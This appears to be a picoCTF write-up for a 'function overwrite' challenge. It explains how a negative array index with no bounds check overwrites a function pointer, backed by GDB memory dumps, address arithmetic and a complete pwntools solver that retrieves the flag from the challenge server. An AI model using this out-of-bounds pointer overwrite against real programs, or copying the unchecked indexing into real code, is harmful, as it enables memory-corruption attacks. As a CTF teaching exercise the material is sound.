# function overwrite

### Description
> Story telling class 2/2

### Solution
Look at this in source code.

```c
  69   │ void (*check)(char*, size_t) = hard_checker;
  70   │ int fun[10] = {0};
```
```c
  82   │   if (num1 < 10)
  83   │   {
  84   │     fun[num1] += num2;
  85   │   }
  86   │
  87   │   check(story, strlen(story));
  88   │ }
```

Look at this using GDB(gef),

(address of `check` is `0x0804c040` and address of `fun` is `0x804c080`)

```
Tell me a story and then I'll tell you if you're a 1337 >> 5
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
0 5

...

gef➤  x/10xg 0x0804c040
0x804c040 <check>:      0x0000000008049436      0x0000000000000000
0x804c050:      0x0000000000000000      0x0000000000000000
0x804c060 <completed.7623>:     0x0000000000000000      0x0000000000000000
0x804c070:      0x0000000000000000      0x0000000000000000
0x804c080 <fun>:        0x0000000000000005      0x0000000000000000
```

you can see that `5` is stored in the number specified (index: `0`).

Therefore, enter `-16 100`, then

(`0x008049436 + 100 = 0x00804949a`)
```
0x804c040 <check>:      0x000000000804949a      0x0000000000000000
```

#### overwrite to `easy_check`
Address of `easy_check` is `0x080492fc`.
`0x008049436 - 0x080492fc = -314`.

Final solver

```python
from pwn import *

#file = "./vuln"
host = "saturn.picoctf.net"
port = 50944
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = remote(host, port)
#io = process(file)

# easy_check = 0x080492fc
# hard_check = 0x08049436

pld = b"AAAAAABGZZZZZZZZZ" #1337
io.sendlineafter(">> ", pld)
io.sendlineafter("10.", "-16 -314")

io.interactive()
#picoCTF{0v3rwrit1ng_P01nt3rs_789b0a98}
```

### Writer
[yu1hpa](https://twitter.com/yu1hpa)

